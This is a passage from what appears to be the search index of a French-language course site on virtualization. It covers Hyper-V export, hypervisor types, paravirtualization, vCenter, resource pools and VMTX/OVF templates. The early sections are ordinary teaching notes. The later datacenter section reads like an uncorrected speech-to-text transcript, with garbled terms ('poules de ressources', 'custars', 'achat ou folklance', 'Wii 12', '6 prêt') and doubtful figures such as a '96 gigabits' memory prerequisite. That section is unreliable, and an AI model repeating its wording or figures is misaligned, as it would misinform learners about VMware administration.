hyperviseur vers un autre et va \u00e9galement modifier les valeurs des adresses Mac des cartes r\u00e9seau de la machine dupliqu\u00e9e afin de ne pas avoir de doublons d'adresse Mac sur le r\u00e9seau. Il faut toutefois \u00eatre vigilant car si le process ne fonctionne pas, et bien on peut se retrouver avec des machines virtuelles qui disposent de la m\u00eame adresse Mac et cela peut emp\u00eacher de faire communiquer les machines virtuelles sur le r\u00e9seau. En exemple, on peut citer d'abord l'exportation de la VM dans un emplacement d\u00e9di\u00e9, donc la copie de tous les fichiers sur un espace de stockage d\u00e9di\u00e9 \u00e0 l'exportation des machines virtuelles. Puis ensuite de la copie de ce r\u00e9pertoire vers le nouvel hyperviseur et enfin de l'importation sans duplication de fichiers. L'importation sans duplication de fichiers va simplement d\u00e9placer les \u00e9l\u00e9ments que l'on a copi\u00e9s depuis l'hyperviseur d'origine vers l'emplacement de travail de la machine virtuelle et comme nous avons fait une copie pr\u00e9alable de ces fichiers et bien nous pouvons continuer \u00e0 soit recopier ces fichiers sur un nouvel hyperviseur ou les rapatri\u00e9s sur l'hyperviseur d'origine. Attention, il faut v\u00e9ritablement s\u00e9lectionner le dossier complet car contrairement \u00e0 d'autres solutions de virtualisation, il n'y a pas qu'une seule dossier pour constituer une machine virtuelle, mais bien plusieurs dossiers.  </p>"},{"location":"Virtualisation/Virtualisation/","title":"Virtualisation","text":""},{"location":"Virtualisation/Virtualisation/#la-virtualisation-en-8-dates","title":"La Virtualisation en 8 dates","text":"<ul> <li>1960/70 : Embryons de la virtualisation en test par IBM puis passage en production sur des mainframes.</li> <li>Milieu 90's : Les \u00e9mulateurs font leur apparitions en Micro-informatique, rendant possible l'\u00e9mulation des machines Atari, Amiga, Amstrad et de consoles.</li> <li>D\u00e9but 2000 : VMware d\u00e9veloppa et popularisa son syst\u00e8me propri\u00e9taire de virtualisation logicielle pour les architecture de type x86.</li> <li>2006 : Prise en charge mat\u00e9rielle par le CPU d'instructions de virtualisation.</li> <li>2007 : Rachat de XenSource par Citrix.</li> <li>2007 : KVM est int\u00e9gr\u00e9 au noyau Linux, permettant la virtualisation de machine sur les OS Linux.</li> <li>2007 : Virtual Desktop Infrastructures VMware.</li> <li>2009 : Plus de serveurs Virtuel que de serveur physique.</li> </ul>"},{"location":"Virtualisation/Virtualisation/#utilisations-de-la-virtualisation","title":"Utilisations de la Virtualisation","text":""},{"location":"Virtualisation/Virtualisation/#pour-quels-usages","title":"Pour quels usages ?","text":"<ul> <li>Les serveurs d'infrastuctures locaux et distants (le Cloud...),</li> <li>Les environnements de test et les probl\u00e9matiques de compatibilit\u00e9,<ul> <li>Permet la cr\u00e9ation d'un nombre elev\u00e9 de machine pouvant comport\u00e9 des versions de logiciel differentes (ou d'OS diff\u00e9rent) afin d'effectuer des tests de compatibilit\u00e9.</li> </ul> </li> <li>Les sc\u00e9narios de PRA (Plan de Reprise d'Activit\u00e9),<ul> <li>En ayant une \"copie\" de son architecture en virtualisation cela permet une reprise plus rapide en cas de crash de l'architecture physique.</li> </ul> </li> </ul>"},{"location":"Virtualisation/Virtualisation/#quels-avantage","title":"Quels avantage ?","text":"<ul> <li>Optimisation des taux d'utilisation du mat\u00e9riel,<ul> <li>Un Os heberg\u00e9 seul sur une machine physique solicite en moyenne 50% des ressources dispo, en hebergeant plusieurs OS cela permet d'utilis\u00e9 entre 70 \u00e0 100% du taux d'utilisation des ressources de la machine.</li> </ul> </li> <li>Economies sur les couts mat\u00e9riels et de gestion,<ul> <li>Le mat\u00e9riel etant optimis\u00e9 et pleinement exploit\u00e9 cela permet de baisser les couts mat\u00e9riel et de gestion.</li> </ul> </li> <li>Economies de gestion et d'energies (green computing),<ul> <li>Plusieurs machine \u00e9tant rassembl\u00e9e en un seul et unique point.</li> </ul> </li> </ul>"},{"location":"Virtualisation/Virtualisation/#les-inconvenients","title":"Les inconv\u00e9nients ?","text":"<ul> <li>Concentration et d\u00e9pendance vis-a-vis d'une solution,<ul> <li>Tous les services \u00e9tant sur la m\u00eame solution, si d\u00e9faillance la totalit\u00e9 des services serait HS.</li> </ul> </li> <li>Mise en oeuvre complexe avec un investissement initial important,</li> <li>Contraintes d'administration sp\u00e9cifiques (d\u00e9ploiement, sauvegarde,etc.),</li> </ul>"},{"location":"Virtualisation/Virtualisation/#les-acteurs-de-la-virtualisation","title":"Les acteurs de la virtualisation","text":"<ul> <li>VMware (Workstation, ESXi...)</li> <li>Microsoft (Hyper-V, Azure en cloud computing)</li> <li>Citrix</li> <li>RedHat</li> <li>Oracle</li> <li>Proxmox via KVM sur Linux</li> <li>Docker permettant de deployer des containers comportant des VM</li> </ul>"},{"location":"Virtualisation/Virtualisation/#les-secteurs-de-la-virtualisation","title":"Les Secteurs de la Virtualisation","text":"<p>Les ressources d'un data Center physique mais aujourd'hui gr\u00e2ce aux acteurs de la virtualisation.</p> <p>La virtualisation de Serveur ne s'applique pas uniquement au serveur informatique, en effet la virtualisation aujourd'hui va \u00eatre utilis\u00e9e dans nombre de composants d'une infrastructure informatique.\u00c0 l'origine le serveur a \u00e9t\u00e9 choisi pour pouvoir mutualiser les ressources d'un data Center physique mais aujourd'hui gr\u00e2ce aux acteurs de la virtualisation et au cloud computing il peut \u00eatre possible d'effectuer de la virtualisation sur :  </p> <ul> <li>Environnements sur un poste de travail,<ul> <li>Les solutions VDI permettent \u00e0 un utilisateur de disposer d'un environnement graphique traditionnel (type windows client) sur un poste virtualis\u00e9.</li> </ul> </li> <li>Applications,</li> <li>Via des plateforme de type PaaS, mettant \u00e0 disposition un environnement applicatif sans avoir la totalit\u00e9 d'un poste physique.</li> <li>Serveurs,<ul> <li>Permettant la cr\u00e9ation de cluster ou il sera possible de renforcer la fiabilit\u00e9 et economiser sur les ressources \u00e0 disposition.</li> </ul> </li> <li>Stations de travail,<ul> <li>Permettant de disposer de mat\u00e9riel plus puissant ou des solutions mat\u00e9rielles sp\u00e9cifiques pour utiliser des applicatifs de cr\u00e9ation graphique ou de CAO/PAO.</li> </ul> </li> </ul> <p>Mais elle peut \u00eatre \u00e9galement deploy\u00e9e dans des domaines plus cibl\u00e9s :  </p> <ul> <li>Le r\u00e9seau,<ul> <li>Notamment chez Cisco.</li> </ul> </li> <li>Le stockage,<ul> <li>Permettant la conservation des donn\u00e9es sur le long terme.</li> </ul> </li> <li>Les services,<ul> <li>Via les solutions de contenairisation.</li> </ul> </li> </ul>"},{"location":"Virtualisation/Virtualisation/#les-principales-solutions","title":"Les principales solutions","text":"Virtualisation de postes de travail VMwareVirtualboxWindowsLinux <ul> <li>VMPlayer  </li> <li>VMWorkstation.  </li> </ul> Permet la virtualisation <ul> <li>poste de travail,  </li> <li>infrastructures virtuelles,  </li> <li>du r\u00e9seau,  </li> <li>des applications.  </li> </ul> <p>N\u00e9cessite un syst\u00e8me d'exploitation de type Windows ou Linux.</p> <p>Solution est d\u00e9velopp\u00e9e par oracle Elle n\u00e9cessite \u00e9galement un syst\u00e8me d'exploitation uniquement Windows cette fois ci.</p> <ul> <li>Windows Virtual PC solution embarqu\u00e9</li> <li>disponible sur les versions professionnelle et entreprise</li> <li>l'hyperviseur hyper-V </li> <li>disponible sur les solutions Windows Server</li> <li>Ne n\u00e9cessite pas l'installation d'un OS serveur elle est disponible en mode autonome.</li> </ul> <ul> <li>QEMU n\u00e9cessite l'installation d'une distribution Linux </li> <li>exploite l'hyperviseur KVM</li> <li>propose un environnement graphique de cr\u00e9ation de machines virtuelles et d'exploitations d'infrastructures virtuelles.</li> </ul> Virtualisation Serveur VMwareMicrosoftCitrixRedHat <ul> <li>VSphere </li> </ul> Virtualisation <ul> <li>Serveurs,</li> <li>Applicatif,</li> <li>VDI,</li> <li>R\u00e9seau</li> </ul> <p>Ces solutions l\u00e0 sont toutes d\u00e9pendantes de la mise en place de la VSphere.</p> <ul> <li>Hyper-V</li> <li>install\u00e9 en mode autonome sur un serveur</li> <li>mise en place d'une solution de Data Center (via l'interm\u00e9diaire d'un active directory)</li> </ul> <ul> <li>hyperviseur \"Xen\" avec la solution \"XenServeur\"</li> </ul> Virtualisation <ul> <li>Des serveurs,</li> <li>Du r\u00e9seau,</li> <li>De l'applicatif </li> </ul> <ul> <li>KVM</li> </ul> Virtualisation <ul> <li>Des serveurs,</li> <li>Du VDI,</li> <li>Du r\u00e9seau</li> </ul>"},{"location":"Virtualisation/Virtualisation/#les-machines-en-virtualisation","title":"Les machines en Virtualisation","text":""},{"location":"Virtualisation/Virtualisation/#lhote","title":"L'h\u00f4te","text":"<p>Pour pouvoir faire de la virtualisation, il faut disposer d'une machine h\u00f4te afin de pouvoir installer notre solution de virtualisation.  </p> <p>L'h\u00f4te est la machine disposant des ressources mat\u00e9riel mis \u00e0 disposition des VM, en effet celle-ci sont \"invit\u00e9s\" \u00e0 exploiter ses ressources par le biais de la solution de virtualisation et de l'hyperviseur. Un h\u00f4te peut heberger plusieurs VM (OS, Poste de travail, Applications).  </p>"},{"location":"Virtualisation/Virtualisation/#machines-virtuelle","title":"Machines Virtuelle","text":"<p>Les Machines Virtuelles (ou VM) utilisent, comme dit au dessus, les ressources mis \u00e0 disposition par l'h\u00f4te. Elles sont d\u00e9finit par un ensemble de fichiers stock\u00e9s dans un repertoire d'acceuil, c'est m\u00eame fichiers sont g\u00e9r\u00e9 par l'hyperviseur. Une machine virtuelle est un ordinateur virtuelle certe mais elle \u00e0 besoin (comme un ordinateur physique) des \u00e9l\u00e9ments suivant pour fonctionner :  </p> <ul> <li>Processeur  </li> <li>RAM (m\u00e9moire vive)  </li> <li>Stockage  </li> <li>Carte r\u00e9seau (optionnel si la VM n'a pas besoin d'acc\u00e9der au r\u00e9seau)</li> </ul>"},{"location":"Virtualisation/Virtualisation/#lhyperviseur","title":"L'hyperviseur","text":"<p>Il s'agit de l'\u00e9l\u00e9ment central et indispensable \u00e0 la virtualisation, sans hyperviseur la virtualisation des syst\u00e8mes ne serait pas possible. En effet c'est lui qui fait le lien entre l'h\u00f4te et les machines virtuelles install\u00e9es. Il s'occupe de la gestion/partage et il priorise l'acc\u00e8s aux ressources dont les VM ont besoin.  </p> <p>l'hyperviseur fait le lien entre les ressources mat\u00e9rielles, mises \u00e0 disposition, et la solution de virtualisation.  </p> <p>Il existe 2 types d'hyperviseurs :  </p>"},{"location":"Virtualisation/Virtualisation/#lhyperviseur-de-type-1","title":"L'hyperviseur de type 1","text":"<p>Il embarque son propre syst\u00e8me d'exploitation, ce syst\u00e8me d'exploitation va permettre de faire l'interface entre les ressources mat\u00e9rielles (CPU, RAM, Stockage) et les machines virtuelles et ceux par l'interm\u00e9diaire de la solution de virtualisation. L'\u00e9change sera effectu\u00e9 de mani\u00e8re binaire, nous avons donc un module de translation binaire int\u00e9gr\u00e9 entre l'hyperviseur et la couche mat\u00e9rielle, les VM ne verront que cette partie binaire.  </p> <p>Parmi les hyperviseurs de type 1 on peut citer :  </p> <ul> <li>Microsoft Hyper-V,  </li> <li>Linux KVM,  </li> <li>Citrix XenServer,  </li> <li>VMware ESXi.</li> </ul> <p>En r\u00e9sum\u00e9 un hyperviseur de type 1</p> <ul> <li>Impl\u00e9mentation : fait office de syst\u00e8me d'exploitation</li> <li>Solutions : Hyper-V, KVM, VMware ESXi, XenServer</li> </ul> <p></p>"},{"location":"Virtualisation/Virtualisation/#lhyperviseur-de-type-2","title":"L'hyperviseur de type 2","text":"<p>La principale caract\u00e9ristique de l'hyperviseur de type 2 est qu'il n\u00e9cessite un OS tiers pour fonctionner (a l'inverse du type 1). Ce Syst\u00e8me d'exploitation sera le lien entre le mat\u00e9riel et les VM. En effet, c'est le syst\u00e8me d'exploitation qui va exploiter, par l'interm\u00e9diaire des drivers, la partie mat\u00e9rielle qui sera ensuite mis a disposition des machines virtuelles via la solution de virtualisation. Elle m\u00eame sera h\u00e9berg\u00e9e soit par un Os Windows ou un Os Linux.  </p> <p>Parmi les hyperviseurs de type 2 on peut citer :  </p> <ul> <li>Oracle VirtualBox</li> <li>Windows Virtual PC</li> <li>VMware Player<ul> <li>Workstation</li> </ul> </li> </ul> <p>En r\u00e9sume un hyperviseur de type 2</p> <ul> <li>L'hyperviseur de type 2..<ul> <li>Impl\u00e9mentation : install\u00e9 en tant qu'application sur un syst\u00e8me d'exploitation  </li> <li>Solutions : Virtualbox, VirtualPC, VMware Player et Workstation</li> </ul> </li> </ul> <p></p>"},{"location":"Virtualisation/Virtualisation/#les-outils-de-la-virtualisation","title":"Les Outils de la virtualisation","text":"<p>Une solution de virtualisation est compos\u00e9e d'un ensemble d'\u00e9l\u00e9ments. Parmi ces \u00e9l\u00e9ments on va retrouver l'\u00e9l\u00e9ment central \"l'hyperviseur\" puis diff\u00e9rentes consoles permettant d'acc\u00e9der \u00e0 des \u00e9l\u00e9ments sp\u00e9cifiques de la solution:  </p> <ul> <li>La console de gestion des machines virtuelles, \u00e9galement appel\u00e9es VMM (Virtual machine manager)  <ul> <li>Cette console, en fonction de la solution, va \u00eatre disponible soit sous forme graphique ou en ligne de commande.</li> </ul> </li> <li>Les consoles d'acc\u00e8s \u00e0 la machine virtuelle qui vont renvoyer l'interface graphique propre \u00e0 chaque machine virtuelle.<ul> <li>Cette interface graphique, lorsqu'elle est pr\u00e9sente, va se pr\u00e9senter soit sous la forme d'une console unique (comme dans le cas de la solution hyper-V) o\u00f9 d'une interface logicielle avec des Onglets (comme dans le pas de VMware workstation).  </li> </ul> </li> </ul> <p>A cela des composants compl\u00e9mentaires s'ajoute, ils vont permettre de modifier les param\u00e9trages mat\u00e9riels comme :  </p> <ul> <li>L'architecture,  </li> <li>Le bios,  </li> <li>Le type de processeur,  </li> <li>Les quantit\u00e9s de m\u00e9moire,  </li> <li>Les diff\u00e9rents disques.  </li> </ul> <p>Nous aurons aussi la possibilit\u00e9 de lier des p\u00e9riph\u00e9riques de type :  </p> <ul> <li>DVD pour associer des images ISO,  </li> <li>USB,  </li> <li>Lecteurs de disquette au format FLP ou IMG (lorsqu'ils sont encore support\u00e9s)  </li> </ul> <p>Un autre composant important va \u00eatre le r\u00e9seau virtuel des profils diff\u00e9rents vont exister en fonction du service souhait\u00e9 sur la machine virtuelle.  Un r\u00e9seau interne ou de type pont sera diff\u00e9rent dans l'utilisation.  </p> <p>Chaque solution dispose ,\u00e9galement, de format de disques diff\u00e9rents. Ces formats de disques vont \u00eatre soit de type:  </p> <ul> <li>VHD pour hyper-V</li> <li>VMDK pour VMware Workstation  </li> </ul> <p>Les solutions de virtualisation proposeront des outils pour manipuler ces fichiers en fonction du besoin (\u00e9tendre ou r\u00e9duire le volume d'un fichier).  </p> <p>Chaque machine virtuelle est d\u00e9termin\u00e9e par un fichier de configuration. Ce fichier de configuration va adopter un format sp\u00e9cifique en fonction de la solution de virtualisation  - XML pour hyper-V, - Vmix pour VMware, - Vbox pour Virtual box.</p> <p>En r\u00e9sum\u00e9, chaque solution h\u00e9berge ses propres outils permettant \u00e0 la fois d'administrer l'hyperviseur, l'\u00e9l\u00e9ment central ou l'ensemble des machines virtuelles ou au cas par cas. Chaque machine virtuelle est la configuration mat\u00e9rielle de chaque machine virtuelle.  </p>"},{"location":"Virtualisation/Virtualisation/#virtualisation-et-paravirtualisation","title":"Virtualisation et Paravirtualisation","text":"<p>Il existe 2 diff\u00e9rences majeures dans la virtualisation:  </p> <p>La premi\u00e8re va \u00eatre la virtualisation dite \"native\" les machines virtuelles ne verront pas la couche interm\u00e9diaire de l'hyperviseur. En effet en virtualisation les donn\u00e9es binaires vont \u00eatre transmises directement des machines virtuelles au mat\u00e9rielles. L'hyperviseur dans ces solutions l\u00e0 va \u00eatre totalement transparent.  </p> <p></p> <p>La deuxi\u00e8me partie qui est la paravirtualisation La Paravirtualisation est une technique de virtualisation dans laquelles les machines virtuelles vont \u00eatre pr\u00e9par\u00e9es pour faire appel \u00e0 l'hyperviseur.  Par cet interm\u00e9diaire elles vont avoir l'impression d'\u00eatre connect\u00e9es au mat\u00e9riel. L'hyperviseur va simplement servir d'interm\u00e9diaire et va transf\u00e9rer au mat\u00e9riel les demandes des machines virtuelles.  </p> <p></p> <p>En r\u00e9sum\u00e9 </p> <p>Dans un contexte de virtualisation, les machines virtuelles s'addressent au mat\u00e9riel pr\u00e9sent\u00e9 par l'hyperviseur. Elles n'ont pas connaissance de sa pr\u00e9sence. Dans la Virtualisation, la solution de virtualisation va traduire les demandes des VM directement au mat\u00e9riel. Dans la Paravirtualisation, les VM sont pr\u00e9par\u00e9es pour faire appel \u00e0 un hyperviseur, les appels sont alors r\u00e9dirig\u00e9s et non traduits. (Dans le cas d'un hyperviseur de type 2 cela passera \u00e9galement par l'OS hebergeant la solution).  </p> <p>Dans les 2 cas les machines virtuelles ne verront que la partie mat\u00e9rielle et ne verront jamais l'hyperviseur.  </p>"},{"location":"Virtualisation/gestion_datacenter/","title":"Gestion datacenter","text":""},{"location":"Virtualisation/gestion_datacenter/#gestion-des-ressources","title":"Gestion des ressources","text":"<p>Dans un data Center les ressources disponibles vont \u00eatre le cumul de toutes les ressources mises \u00e0 disposition par les h\u00f4tes 2 virtualisations .Nous allons voir ici qu'il est possible de r\u00e9server des ressources pour des machines virtuelles . En effet , la quantit\u00e9 de m\u00e9moire vive et de CPU va pouvoir \u00eatre limit\u00e9e par un syst\u00e8me de r\u00e9servation . Ceci .Ce syst\u00e8me de r\u00e9servation va \u00e9viter d'avoir un ph\u00e9nom\u00e8ne de saturation par une machine virtuelle de la totalit\u00e9 des ressources . En effet , aujourd'hui , il est fr\u00e9quent que certaines nations virtuelles soient victimes d'attaques . Une partie de ces attaques va consister \u00e0 saturer les ressources d'une machine virtuelle afin de d'arr\u00eater le service fourni par cette machine virtuelle .Sur une solution de virtualisation par d\u00e9faut , les machines virtuelles n'ont aucune limite en termes de r\u00e9servation de ressources , ce qui peut \u00eatre probl\u00e9matique , une machine virtuelle peut absorber la totalit\u00e9 des ressources \u00e0 disposition du data Centeret dans ce cas , les autres machines virtuelles n'auront plus de ressources de fonctionnement .Pour \u00e9viter cela , on va pouvoir employer des r\u00e9servations les .Peuvent se faire sur 3 niveaux au niveau d'une masse une virtuelle et dans ce cas l\u00e0 nous allons r\u00e9server des ressources uniquement pour cette machine .On peut \u00e9galement cr\u00e9er des ensembles de ressources ou poules de ressources et .Classer des machines virtuelles danser poules de ressources nous allons voir \u00e0 la suite .De l'utilisation d'un cluster Eh bien nous pouvons \u00e9galement r\u00e9server des ressources pour les machines h\u00e9berg\u00e9es \u00e0 l'int\u00e9rieur de cet oster .Un exemple ici o\u00f9 un ao\u00fbt de virtualisation va r\u00e9server pour un ensemble ici l'ensemble VM prod dans lequel nous allons avoir 3 machines virtuelles et bien nous allons r\u00e9server une certaine quantit\u00e9 de RAM et une certaine quantit\u00e9 de CPU pour cet ensemble de .Actualisation un boule de ressources va \u00eatre un objet logique cet objet peut \u00eatre cr\u00e9\u00e9 soit sur un hyperviseur autonome soit sur un data Center ce .De ressources va contenir des machines virtuelles dans notre exemple ici nous avons l'h\u00f4te autonome d\u00e9termin\u00e9e par son adresse IP 172 18 11 . 13 qui est lui m\u00eame h\u00e9berg\u00e9 dans le data Center d'essai un et nous voyons que 2 poules de ressources ont \u00e9t\u00e9 exag\u00e9es le RPVM prod et le RPVM test c'est ?RP contiennent ensuite 2 machines virtuelles chacun nous avons dans le boulder source vous avez un prod W 12 d\u00e9c\u00e8s en et W 2 8 2 - appli un et dans le RPVM test CMW 7 test un et CLXT test 2l'int\u00e9r\u00eat de l'emploi de ces poules de ressources va \u00eatre la r\u00e9servation des ressourcesici nous voyons dans le tableau sur la droite que le RPVM prod va r\u00e9server 8000 m\u00e9ga hertz au niveau du CPU donc o\u00f9 nous avons une garantie d'avoir \u00e0 disposition au minimum 8000 m\u00e9ga hertz pour les 2 machines virtuelles situ\u00e9es dans le p\u00f4le RPVM prod et puis nous n'avons aucune limite nous pouvons donc employer la totalit\u00e9 des ressources CPU disponibles pour les machines virtuellesdu RPZ . \u00c0 l'inverse le RPVM test n'a aucune r\u00e9servation si la totalit\u00e9 des ressources sont employ\u00e9es dans l'autre poule de ressources et bien aucune mesure virtuelle ne pourrait \u00eatre utilis\u00e9e dans le RPVM testet \u00e9galement nous avons appliqu\u00e9 une limite \u00e0 2000 m\u00e9gahertz pour le RPVM test ce qui veut dire que les 2 machines virtuelles ne pourront jamais employer plus de 2000 m\u00e9gas. Cette configuration l\u00e0 va \u00eatre faite afin d'\u00e9viter le ph\u00e9nom\u00e8ne de saturation des machines virtuelles . La configuration des poules permet de garantir la disponibilit\u00e9 des ressources pour les besoins cruciaux de l'entreprise .  </p>"},{"location":"Virtualisation/gestion_datacenter/#vcenter-et-le-concept-de-datacenter","title":"vCenter et le concept de datacenter","text":"<p>Center est le concept de data Center nous allons parler dans les diff\u00e9rents modules du V Center le V Center va permettre d'avoir une gestion globale de la totalit\u00e9 des ressources n\u00e9cessaires \u00e0 l'utilisation de la veste ferme .L'ajout d'un V Center a une infrastructure autonome , va se faire par la cr\u00e9ation , soit d'une machine virtuelle h\u00e9berg\u00e9e sur un hyperviseur autonome , soit pas la mise en place d'une influence cette appliance peut \u00eatre \u00e9galement h\u00e9berg\u00e9e en tant que machine virtuelle o\u00f9 \u00eatre h\u00e9berg\u00e9 sur une machine physique ind\u00e9pendante d'un hyperviseur .L'ajout du V Center va permettre de cr\u00e9er un nouvel objet que l'on appelle le data Center le .Le data Center va ensuite obligatoirement comporter des autres , ces h\u00f4tes sont les h\u00f4tes de virtualisation que nous avons d\u00e9j\u00e0 parl\u00e9 pr\u00e9c\u00e9demment .L'int\u00e9r\u00eat d'utiliser un data Center et de regrouper au sein d'une m\u00eame entit\u00e9 , les \u00e9l\u00e9ments qui vont participer \u00e0 la solution de virtualisation .Nous l'avons vu \u00e9galement pr\u00e9c\u00e9dent , les diff\u00e9rents objets pr\u00e9sents sur les autres vont \u00eatre regroup\u00e9s au m\u00eame endroit . Il s'agit des objets r\u00e9seaux .Vss et VDS , mais \u00e9galement des objets de stockage , les d\u00e9testables, quel que soit le type de data Store .L'emploi du data Center va \u00eatre obligatoire pour utiliser les fonctionnalit\u00e9s de d\u00e9placement de VM \u00e0 chaud comme V motion ou de d\u00e9placement de stockage de VM Storage V motionet \u00e9galement le data Center et le pr\u00e9requis indispensable pour l'utilisation de custars .L'utilisation des clusters est \u00e9galement un pr\u00e9requis pour l'utilisation des fonctions des fonctionnalit\u00e9s de type achat ou folklance .Vincent est donc un \u00e9l\u00e9ment indispensable \u00e0 la mise en \u0153uvre et au fonctionnement de ses services .Il est \u00e9videmment recommand\u00e9 qu'il soit h\u00e9berg\u00e9 sur une machine virtuelle , hautement disponible . En effet , si le V Center n'est plus disponible et bien la totalit\u00e9 de ses fonctionnalit\u00e9s vont \u00e9galement \u00eatre indisponibles .Il existe diff\u00e9rentes versions et mode de notre V Center et \u00e9videmment , comme nous l'avions d\u00e9j\u00e0 vu une licence sp\u00e9cifique sera assign\u00e9e \u00e0 un r\u00e9cepteur sp\u00e9cifique .Dans les 2 impl\u00e9mentations possibles , nous retrouvons la clience VCSA cette .Lance ne pourront g\u00e9rer que 5 au maximum .Le 5 ao\u00fbt 2 virtualisation au maximum pour la playence V 16 .Machine virtuelle maximum courront \u00e9galement \u00eatre g\u00e9r\u00e9s par le V 16 lesQuelles sont la simplicit\u00e9 les pr\u00e9requis en en termes de m\u00e9moire vive seront faibles les ? Les inconv\u00e9nients \u00e9videmment seront la limite du nombre d'autres pris en charge .Il est possible d'utiliser la version compl\u00e8te du V Center dans ce cas l\u00e0 , on parle du V Center serveur .C'est Rocky indispensable et l'utilisation d'un syst\u00e8me Microsoft Windows Server en version 64 bits .Il y a \u00e9galement un pr\u00e9requis m\u00e9moire important qui est de 96 gigabits de m\u00e9moire au minimum ?Gr\u00e2ce \u00e0 ce V Center serveur , nous allons pouvoir g\u00e9rer 1000 donc nous arrivons dans une cat\u00e9gorie beaucoup plus importante . Nous pouvons \u00e9galement encadrer 10000 verres .L'avantage \u00e9vident est une capacit\u00e9 bien sup\u00e9rieure de la prise en charge des diff\u00e9rents \u00e9l\u00e9ments . Mais l'inconv\u00e9nient , \u00e9videmment , est le co\u00fbt de mise en \u0153uvre du fait des pr\u00e9requis mat\u00e9riels et logiciels et \u00e9videmment le co\u00fbt de licence va \u00eatre beaucoup plus \u00e9lev\u00e9 .La mise en place d'un VCSA d'un . Ou d'un V Center serveur va n\u00e9cessiter une phase de d\u00e9ploiement .Lors de la mise en place du VCSA , nous devons dans un premier temps acc\u00e9der par le port 54 80 \u00e0 partir d'un navigateur web. Le pauvre 54 80 restera le port d'administration d'u . VCSA .Lors du premier d\u00e9marrage , le VCSA va n\u00e9cessiter une configuration de base .Une fois cette configuration de base effectu\u00e9e le VCSA va devenir disponible \u00e0 partir du port 443 le port Https \u00e9tait .Il est \u00e9galement possible d'acc\u00e9der \u00e0 partir du corps 94 43 pour les versions ant\u00e9rieures \u00e0 la version 6. En effet , dans ce cas l\u00e0 , une interface web \u00e0 base de plugin flash Player est disponible .Elle est accessible \u00e0 travers le port 94 43. Toutes les gestions du VCSA va se faire en HTTPS et l'administration du serveur qui l'h\u00e9berge se fera en 5480 .  </p>"},{"location":"Virtualisation/gestion_datacenter/#les-modeles-de-machines-virtuelles","title":"Les modeles de machines virtuelles","text":"<p>La topologie de type data Center va permettre une emploi de mod\u00e8le de machine virtuelle en effet .En effet , parmi les fonctionnalit\u00e9s disponibles , un data Center va pouvoir cr\u00e9er des machines virtuelles toutes identiques \u00e0 partir d'un mod\u00e8le de r\u00e9f\u00e9rence .Il existe 2 types de mod\u00e8les , le mod\u00e8le de type OVF , qui est un standard parmi les solutions de virtualisation . En effet , un mod\u00e8le OVF peut \u00eatre utilis\u00e9 sur des solutions de type poste de travail comme GMORE workstation . Mais \u00e9galement sur des solutions globales de type V sph\u00e8re ou des solutions concurrentes comme Virtualbox .Les avantages de cette solution sont d'\u00eatre transitives entre diff\u00e9rentes plateformes .Il est possible d'importer une machine virtuelle \u00e0 partir d'un OVF , mais \u00e9galement d'une machine virtuelle , d'exporter vers le format OVF. Dans quel cas nous allons trouver , Eh bien lors d'un partage de machines virtuelles, l'inconv\u00e9nient du mod\u00e8le OVF , c'est qu'il ne peut pas \u00eatre reconnu comme un mod\u00e8le de d\u00e9ploiement et on ne pourra pas automatiser le d\u00e9ploiement de machines virtuelles \u00e0 partir de ce mod\u00e8le . Toutes les actions de cr\u00e9ation devront passer par une chasse d'import manuelle pour le mod\u00e8le OVF .\u00c0 l'inverse , le mod\u00e8le VMTX va \u00eatre propri\u00e9taire 1 sph\u00e8re . Un mod\u00e8le VMTX devra \u00eatre d'abord converti en OVF pour \u00eatre employ\u00e9 sur d'autres solutions de virtualisation .Le mod\u00e8le VMTX va permettre de cloner une machine virtuelle vers un mod\u00e8le dupliquer une machine virtuelle vers un mod\u00e8le , d\u00e9ployer une VM depuis ce mod\u00e8le et enfin l'avantage principal de ce mod\u00e8le VMTX est la possibilit\u00e9 de modification. En effet , par rapport \u00e0 un mod\u00e8le OVF qui va \u00eatre statique , un mod\u00e8le VMTX va pouvoir \u00eatre modifi\u00e9 sans passer par un d\u00e9ploiement de machines virtuelles , une modification , puis un recommenage vers le temple . Les mod\u00e8les VMTX vont pouvoir \u00eatre modifi\u00e9s \u00e0 foi par la solution VSR .L'utilisation des VMTX va \u00eatre des utilisations de base de mod\u00e8les pour pouvoir cr\u00e9er rapidement des machines virtuelles identiques . Vous citez par exemple 1 de type serveur web ?La solution va se faire va pouvoir cr\u00e9er des machines virtuelles de mani\u00e8re automatique \u00e0 base d'un mod\u00e8le de serveur web en mode VMTX afin par exemple d'absorber une mont\u00e9e en charge ou une demande importante de machines virtuelles .En d\u00e9tail , les mod\u00e8les VMTX sont des images de machines virtuelles qui vont permettre un d\u00e9ploiement optimis\u00e9 .Qu'est ce qui est contenu dans ces VMTX ? Nous allons d\u00e9clarer un syst\u00e8me d'exploitation qui peut \u00eatre de type Wii 12 ou de type Unix Linux . Nous avons \u00e9galement avoir une collection de pilotes , ces pilotes vont \u00eatre n\u00e9cessaires par rapport \u00e0 l'ao\u00fbt de virtualisation qui va faire fonctionner les massines virtuelles d\u00e9termin\u00e9es \u00e0 partir du mod\u00e8le VMTX . Nous allons pouvoir ajouter des applications . Nous allons \u00e9galement pouvoir au besoinrajouter des correctifs ou des mises \u00e0 jour au mod\u00e8le VMTX .Chaque mod\u00e8le est g\u00e9n\u00e9ralement personnalis\u00e9 pour une utilisation adapt\u00e9e au contexte de l'entreprise . Ces mod\u00e8les VMTX vont pouvoir \u00eatre g\u00e9r\u00e9s directement depuis l'interface d'administration V moins RV 7. Les possibilit\u00e9s pour g\u00e9n\u00e9rer un mod\u00e8le VMTX vont \u00eatre soit une conversion directe d'une machine virtuelle en mod\u00e8le VNTX et dans ce cas l\u00e0 on parlera de cr\u00e9ation de master . En effet , nous allons installer une machine virtuelle dite de r\u00e9f\u00e9rence . La personnalis\u00e9e par l'installation d'applications , la mise \u00e0 jour de pilote et dans lequel notamment d'une machine Windows , la mise en place de ce qu'on appelle le 6 pr\u00eat . Le 6 prep qui va permettre \u00e0 toutes les machines virtuelles et g\u00e9n\u00e9rer \u00e0 partir du mod\u00e8led'avoir un identifiant SAID unique .Une fois la conversion de la VM en mod\u00e8le , il est possible \u00e0 l'inverse de reprendre un mod\u00e8le et de le reconvertir en machine virtuelle . Dans ce cas l\u00e0 , Eh bien \u00e7a peut \u00eatre pour une mise \u00e0 jour de cette machine virtuelle . La suppression ou l'ajout d'applications . Une fois les mises \u00e0 jour effectu\u00e9es , on reprend le chemin inverse , reconversion 2 vers le mod\u00e8le .Il est \u00e9galement possible de faire des clowns de machines berthel\u00e9es . Dans ce cas l\u00e0 on ne perd pas la massine virtuelle de de de 